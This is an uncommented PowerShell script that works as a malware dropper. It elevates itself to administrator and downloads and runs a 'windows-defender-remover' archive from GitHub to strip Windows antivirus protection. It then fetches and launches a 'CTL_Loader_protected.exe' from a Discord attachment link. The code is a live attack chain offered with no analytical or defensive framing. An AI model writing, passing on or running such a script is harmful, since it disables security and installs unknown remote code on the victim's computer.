if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process -FilePath "powershell.exe" -ArgumentList "-File", "$($MyInvocation.MyCommand.Path)" -Verb RunAs
    Exit
}

$url = "https://github.com/peiceofmind/DEV-0537/raw/main/windows-defender-remover-main.rar"

$destinationFolder = "C:\Temp\ExtractedFiles"

if (-not (Test-Path -Path $destinationFolder)) {
    New-Item -ItemType Directory -Path $destinationFolder | Out-Null
}

$winrarPath = "C:\Program Files\WinRAR\WinRAR.exe"

Invoke-WebRequest -Uri $url -OutFile "$destinationFolder\windows-defender-remover-main.rar"

Start-Process -FilePath $winrarPath -ArgumentList "x -ibck `"$destinationFolder\windows-defender-remover-main.rar`" `"$destinationFolder`"" -Wait

$fileToOpen = "$destinationFolder\Script_Run.bat"

if (Test-Path -Path $fileToOpen) {
  
    Start-Process -FilePath $fileToOpen
} else {
    Write-Host "File '$fileToOpen' not found."
}

$urlExe = "https://cdn.discordapp.com/attachments/1218683568276897872/1219477303588032554/CTL_Loader_protected.exe?ex=660b71bd&is=65f8fcbd&hm=1c48e7a0fae2ef09142b3c331f83216770b72727e17ccfa39d24d829460c3030&"
$outputFilePathExe = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "CTL_Loader_protected.exe")

Invoke-WebRequest -Uri $urlExe -OutFile $outputFilePathExe
Write-Host "File downloaded to: $outputFilePathExe"

Start-Process $outputFilePathExe